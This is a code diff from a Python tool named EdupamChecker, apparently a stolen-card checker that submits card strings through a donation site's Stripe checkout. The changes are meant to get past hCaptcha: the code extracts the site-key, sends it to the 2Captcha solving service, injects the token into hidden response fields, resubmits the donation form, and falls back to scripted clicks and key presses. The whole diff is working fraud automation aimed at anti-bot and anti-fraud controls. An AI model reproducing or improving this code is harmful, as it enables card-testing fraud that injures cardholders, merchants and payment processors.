@@ -789,115 +789,270 @@ class EdupamChecker:
             return None
     
     def solve_captcha_if_present(self, page, card_last4):
-        """Detectar y resolver hCaptcha si está presente"""
+        """Detectar y resolver hCaptcha si está presente - VERSIÓN CORREGIDA"""
         try:
             time.sleep(3)
             
-            # Detectar si hay hCaptcha
-            captcha_detected = False
+            logger.info(f"🔍 Verificando captcha para ****{card_last4}")
             
-            # Verificar por iframes
+            # 1. Buscar el iframe INTERACTIVO de Stripe (no el de hCaptcha)
+            stripe_hcaptcha_frame = None
             for frame in page.frames:
-                if 'hcaptcha' in frame.url.lower():
-                    captcha_detected = True
+                frame_url = frame.url.lower()
+                # Buscar el iframe de Stripe que contiene hCaptcha
+                if 'stripe.com' in frame_url and 'hcaptcha' in frame_url:
+                    stripe_hcaptcha_frame = frame
+                    logger.info(f"✅ Iframe Stripe+hCaptcha encontrado: {frame_url[:100]}...")
                     break
             
-            # Verificar por texto
-            page_content = page.content().lower()
-            hcaptcha_indicators = [
-                'hcaptcha',
-                'i am human',
-                'soy humano',
-                'one more step',
-                'select the checkbox'
-            ]
+            # 2. Si no encontramos el iframe de Stripe, buscar cualquier hCaptcha
+            if not stripe_hcaptcha_frame:
+                logger.info("🔍 Buscando cualquier iframe hCaptcha...")
+                for frame in page.frames:
+                    frame_url = frame.url.lower()
+                    if 'hcaptcha' in frame_url:
+                        stripe_hcaptcha_frame = frame
+                        logger.info(f"✅ Iframe hCaptcha encontrado: {frame_url[:100]}...")
+                        break
             
-            if not captcha_detected and any(indicator in page_content for indicator in hcaptcha_indicators):
-                captcha_detected = True
-            
-            if not captcha_detected:
-                logger.info(f"✅ No se detectó captcha para ****{card_last4}")
+            if not stripe_hcaptcha_frame:
+                logger.info(f"✅ No hay captcha visible para ****{card_last4}")
                 return True
             
-            logger.info(f"🔍 hCaptcha detectado para ****{card_last4}")
+            # 3. Extraer site-key del iframe PRINCIPAL (no del iframe interno)
+            site_key = None
+            page_content = page.content()
             
-            # Extraer site-key
-            site_key = self.extract_hcaptcha_sitekey(page)
+            # Buscar site-key en la página principal
+            matches = re.findall(r'sitekey["\']?\s*[:=]\s*["\']([^"\']+)["\']', page_content, re.I)
+            if matches:
+                site_key = matches[0]
+                logger.info(f"✅ Site-key de página principal: {site_key[:30]}...")
+            
+            # Si no se encuentra, intentar extraer de algún div
+            if not site_key:
+                site_key = page.evaluate("""
+                    () => {
+                        const element = document.querySelector('.h-captcha, [data-sitekey]');
+                        return element ? element.getAttribute('data-sitekey') : null;
+                    }
+                """)
+                if site_key:
+                    logger.info(f"✅ Site-key del DOM: {site_key[:30]}...")
             
             if not site_key:
-                logger.error(f"❌ No se pudo extraer site-key")
-                # Intentar bypass manual
-                if self.captcha_solver.bypass_hcaptcha_manually(page, card_last4):
-                    logger.info(f"✅ Bypass manual exitoso")
-                    return True
-                return False
-            
-            logger.info(f"✅ Site-key obtenido: {site_key[:30]}...")
-            
-            # Intentar resolver con servicios
-            page_url = page.url
-            solution = self.captcha_solver.solve_hcaptcha(site_key, page_url)
-            
-            if not solution:
-                logger.error(f"❌ No se pudo resolver el hCaptcha")
-                # Intentar bypass manual como último recurso
-                if self.captcha_solver.bypass_hcaptcha_manually(page, card_last4):
-                    logger.info(f"✅ Bypass manual exitoso como fallback")
-                    return True
-                return False
-            
-            logger.info(f"✅ hCaptcha resuelto para ****{card_last4}")
-            
-            # Inyectar solución
-            try:
-                page.evaluate("""
-                    (solution) => {
-                        console.log('🎯 Inyectando solución hCaptcha...');
-                        
-                        // Campo para hCaptcha
-                        let field = document.querySelector('[name="h-captcha-response"]');
-                        if (!field) {
-                            field = document.getElementById('h-captcha-response');
-                        }
-                        
-                        if (!field) {
-                            field = document.createElement('textarea');
-                            field.name = 'h-captcha-response';
-                            field.id = 'h-captcha-response';
-                            field.style.display = 'none';
-                            document.body.appendChild(field);
-                        }
-                        
-                        field.value = solution;
-                        
-                        // Disparar eventos
-                        ['change', 'input'].forEach(eventType => {
-                            field.dispatchEvent(new Event(eventType, { bubbles: true }));
-                        });
-                        
-                        console.log('✅ Solución inyectada');
-                        return true;
-                    }
-                """, solution)
+                logger.error(f"❌ No se pudo extraer site-key para ****{card_last4}")
                 
+                # INTENTO ESPECIAL: Hacer clic directamente en la página, no en el iframe
+                logger.info("🔄 Intentando clic directo en página...")
+                try:
+                    # Buscar el contenedor de hCaptcha en la página principal
+                    hcaptcha_container = page.locator('.h-captcha, [data-sitekey], div[class*="captcha"]')
+                    if hcaptcha_container.count() > 0:
+                        logger.info("✅ Contenedor hCaptcha encontrado en página")
+                        
+                        # Obtener posición y hacer clic
+                        bounding_box = hcaptcha_container.bounding_box()
+                        if bounding_box:
+                            x = bounding_box['x'] + bounding_box['width'] * 0.15
+                            y = bounding_box['y'] + bounding_box['height'] * 0.60
+                            
+                            logger.info(f"🎯 Haciendo clic en posición: {x}, {y}")
+                            page.mouse.click(x, y)
+                            time.sleep(3)
+                            
+                            # Verificar si desapareció
+                            new_content = page.content().lower()
+                            if 'hcaptcha' not in new_content and 'i am human' not in new_content:
+                                logger.info("✅ ¡Captcha resuelto con clic directo!")
+                                return True
+                except Exception as e:
+                    logger.error(f"❌ Error clic directo: {e}")
+                
+                return False
+            
+            # 4. Intentar resolver con 2Captcha (pero primero verificar si es invisible)
+            logger.info(f"🎯 Resolviendo hCaptcha - Sitekey: {site_key[:30]}...")
+            logger.info(f"🔗 URL: {page.url}")
+            
+            # Verificar si es hCaptcha invisible (Stripe usa invisible)
+            is_invisible = "invisible" in page_content.lower()
+            logger.info(f"📝 Tipo de hCaptcha: {'INVISIBLE' if is_invisible else 'VISIBLE'}")
+            
+            if not self.captcha_solver.api_keys.get('2captcha'):
+                logger.error("❌ No hay API key de 2Captcha configurada")
+                return False
+            
+            # CONFIGURACIÓN CORRECTA para Stripe hCaptcha
+            page_url = page.url
+            
+            # PRIMERO: Intentar con método directo específico para Stripe
+            logger.info("🔄 Enviando a 2Captcha con configuración Stripe...")
+            
+            # Configuración para hCaptcha invisible de Stripe
+            task_config = {
+                "type": "HCaptchaTaskProxyless",
+                "websiteURL": page_url,
+                "websiteKey": site_key,
+                "isInvisible": True,  # ¡IMPORTANTE! Stripe usa invisible
+                "enterprisePayload": {
+                    "rqdata": "",  # Stripe puede requerir rqdata
+                    "sentry": True
+                }
+            }
+            
+            try:
+                data = {
+                    "clientKey": self.captcha_solver.api_keys['2captcha'],
+                    "task": task_config
+                }
+                
+                response = requests.post(
+                    "https://api.2captcha.com/createTask",
+                    json=data,
+                    timeout=30
+                )
+                
+                result = response.json()
+                logger.info(f"📥 Respuesta 2Captcha: {result}")
+                
+                if result.get("errorId", 1) == 0:
+                    task_id = result["taskId"]
+                    logger.info(f"✅ Tarea aceptada (ID: {task_id})")
+                    
+                    # Esperar solución
+                    for i in range(20):
+                        time.sleep(5)
+                        
+                        params = {"clientKey": self.captcha_solver.api_keys['2captcha'], "taskId": task_id}
+                        resp = requests.post("https://api.2captcha.com/getTaskResult", json=params, timeout=30)
+                        status_result = resp.json()
+                        
+                        logger.info(f"⏳ Intento {i+1}: {status_result.get('status')}")
+                        
+                        if status_result.get("status") == "ready":
+                            solution = status_result.get("solution", {}).get("gRecaptchaResponse")
+                            if solution:
+                                logger.info(f"✅ hCaptcha resuelto!")
+                                
+                                # Inyectar solución
+                                page.evaluate("""
+                                    (solution) => {
+                                        // Para hCaptcha
+                                        let field = document.querySelector('[name="h-captcha-response"]');
+                                        if (!field) {
+                                            field = document.createElement('textarea');
+                                            field.name = 'h-captcha-response';
+                                            field.style.display = 'none';
+                                            document.body.appendChild(field);
+                                        }
+                                        field.value = solution;
+                                        
+                                        // También para reCAPTCHA por si acaso
+                                        let gfield = document.querySelector('[name="g-recaptcha-response"]');
+                                        if (!gfield) {
+                                            gfield = document.createElement('textarea');
+                                            gfield.name = 'g-recaptcha-response';
+                                            gfield.style.display = 'none';
+                                            document.body.appendChild(gfield);
+                                        }
+                                        gfield.value = solution;
+                                        
+                                        // Disparar eventos
+                                        ['change', 'input'].forEach(eventType => {
+                                            field.dispatchEvent(new Event(eventType, { bubbles: true }));
+                                            gfield.dispatchEvent(new Event(eventType, { bubbles: true }));
+                                        });
+                                        
+                                        return true;
+                                    }
+                                """, solution)
+                                
+                                time.sleep(2)
+                                
+                                # Re-enviar formulario
+                                submit_selectors = [
+                                    '#btn-donation',
+                                    'button[type="submit"]',
+                                    'input[type="submit"]',
+                                    '.submit-btn',
+                                    '[data-testid="submit"]'
+                                ]
+                                
+                                for selector in submit_selectors:
+                                    btn = page.locator(selector)
+                                    if btn.count() > 0:
+                                        logger.info(f"✅ Re-enviando con selector: {selector}")
+                                        btn.click()
+                                        time.sleep(5)
+                                        break
+                                
+                                return True
+                
+            except Exception as e:
+                logger.error(f"❌ Error 2Captcha API: {e}")
+            
+            # SI FALLA 2CAPTCHA, intentar clic manual MEJORADO
+            logger.info("🔄 Falló API, intentando método manual mejorado...")
+            
+            # Estrategia MEJORADA para hCaptcha invisible
+            try:
+                # PRIMERO: Hacer clic en el BOTÓN de envío otra vez (a veces activa el captcha)
+                page.click('#btn-donation', timeout=2000)
                 time.sleep(2)
                 
-                # Re-enviar si es necesario
-                submit_btn = page.locator('button[type="submit"], #btn-donation, input[type="submit"]')
-                if submit_btn.count() > 0:
-                    submit_btn.click()
-                    time.sleep(5)
+                # SEGUNDO: Buscar y hacer clic en cualquier elemento que parezca captcha
+                captcha_selectors = [
+                    '.h-captcha',
+                    '[data-sitekey]',
+                    'iframe[src*="hcaptcha"]',
+                    '.captcha-container',
+                    '.checkbox-container'
+                ]
+                
+                for selector in captcha_selectors:
+                    elements = page.locator(selector)
+                    if elements.count() > 0:
+                        logger.info(f"✅ Elemento encontrado: {selector}")
+                        
+                        # Obtener posición y hacer clic
+                        bounding_box = elements.first.bounding_box()
+                        if bounding_box:
+                            # Clic en posición del checkbox (15%, 60%)
+                            x = bounding_box['x'] + bounding_box['width'] * 0.15
+                            y = bounding_box['y'] + bounding_box['height'] * 0.60
+                            
+                            logger.info(f"🎯 Clic en: {x}, {y}")
+                            page.mouse.click(x, y)
+                            time.sleep(3)
+                            
+                            # Clic adicional cerca por si acaso
+                            page.mouse.click(x + 10, y + 10)
+                            time.sleep(2)
+                            
+                            # Verificar
+                            new_content = page.content().lower()
+                            if 'hcaptcha' not in new_content:
+                                logger.info("✅ Posiblemente resuelto")
+                                return True
+                
+                # TERCERO: Simular tecla TAB y ENTER (para captcha invisible)
+                logger.info("🔄 Probando teclas TAB + ENTER...")
+                page.keyboard.press('Tab')
+                time.sleep(1)
+                page.keyboard.press('Enter')
+                time.sleep(3)
                 
                 return True
                 
             except Exception as e:
-                logger.error(f"❌ Error inyectando solución: {e}")
+                logger.error(f"❌ Error método manual: {e}")
                 return False
-                
+                    
         except Exception as e:
             logger.error(f"❌ Error en solve_captcha_if_present: {e}")
             return False
-    
+
     def check_single_card(self, card_string, amount=50):
         """Verificar una sola tarjeta"""
         card_last4 = card_string.split('|')[0][-4:] if '|' in card_string else '????'
